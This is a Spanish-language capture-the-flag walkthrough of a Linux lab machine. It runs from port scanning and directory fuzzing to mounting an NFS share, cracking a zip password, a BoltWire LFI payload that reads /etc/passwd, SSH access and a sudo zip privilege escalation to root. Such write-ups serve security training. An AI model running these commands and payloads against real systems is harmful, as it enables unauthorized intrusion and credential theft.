## Summary

Tags: #Linux #Montura #Fuzzing #FCrackZip #LFI  

- IP -> 192.168.68.1
- Ports -> TCP (22,80,111,2049,8080,42417,45263), UDP (idk)
- OS ->  Linux
- Services & Applications
    - 22 -> SSH
    - 80 -> HTTP
    - 8080 -> HTTP 

## Recon

```bash 
❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn ❮Target IP❯  -oG allPorts
```

```bash
❯ nmap -sCV -p22,... ❮Target IP❯ -oN targeted
```

Miramos la web, por sus dos puertos, el 80 y el 8080 'php'

```bash
❯ ffuf -w /usr/share/Seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u https://192.168.68.1/FUZZ -v 
```

```bash
❯ ffuf -w /usr/share/Seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u https://192.168.68.1:8080/FUZZ -v 
```

```bash
❯ showmount -e 192.168.68.1               # Para ver si nos muestra informacion de una montura
```
Nos muestra la de **/srv/nfs**

```bash
❯ mkdir /mnt/dev                          # Creamos un dir en donde colocaremos el archivo  
```

```bash
❯ mount -t nfs 192.168.68.1:/svr/nfs /mnt/dev    # Le diremos que la monturta nos las coloque en el dir que hemos creado
```
Nos muestra un archivo **save.zip**

```bash
❯ unzip save.zip                           # Al momento de hacerle unzip nos pide una passwd que no tenemos,  pero nos muestra que adentro hay un archivo id_rsa y un .txt
```

Usaremos la siguiente herramienta para poder crackear el .zip
```bash
❯ fcrackzip -v -u -D -p /usr/share/worlists/rockyou.txt save.zip

	# v = Verbose
	# u = Unzip
	# D = Dictionary attack
	# p = File to attack 'save.zip'
```
Nos regresa la passwd: java101

Ahora si podemos descomprimir el archivo 
* Encontramos en el .zip el nombre de un usuario 'jp' y ahora podemos usar el ssh para poder entrar a la maquina, ya que tenemos el 'id_rsa'

```bash
❯ ssh -i id_rsa jp@192.168.68.1                         # Nos conectamos por ssh teniendo un id_rsa con privilegio 600
```
Pero no funciona porque nos pide una passwd y no es la misma que habiamos encontrado. 

Ahora miramos los dir en la web que encontramos para el puerto **8080** que son **/dev/**
Y para el puerto **80, /app/** en donde encontramos varios folders, nos metemos a la carpeta de **config** y despues a **config.yml** y lo descargamos. 

Ahi encontramos un usuario y passwd **'bolt:I_love_java'**

Buscamos en Google **'BoltWire exploit'** y nos sale que hay un **LFI**
```bash
❯ http://192.168.68.1:8080/dev/index.php?p=action.search&action=../../../../../../../etc/passwd
```
Ahi encontramos al usuario **'jp = jeanpaul'**

## User

```bash
❯ ssh -i id_rsa jeanpaul@192.168.68.1                         # Nos conectamos por ssh teniendo un id_rsa con privilegio 600
```
Nos pide una 'passphrase' y colocamos la passwd que habiamos encontrado 'I_love_java'

```bash
❯ sudo -l                     # Para ver si tenemos privilegios en el Sudoers (l=ele), que podamos ejecutar comandos como (root) NOPASSWD
```
Encontramos que podemos ver **/usr/bin/zip** en donde no es necesario la passwd.

Ahora buscamos en la siguiente pagina:
GTFOBins [GTFOBins](https://gtfobins.github.io/)

## Root

```bash
TF=$(mktemp -u)                               # Encontramos sudo 'zip'
sudo zip $TF /etc/hosts -T -TT 'sh #'
sudo rm $TF
```
Y ahora somos root y buscamos la flag 'flag.txt'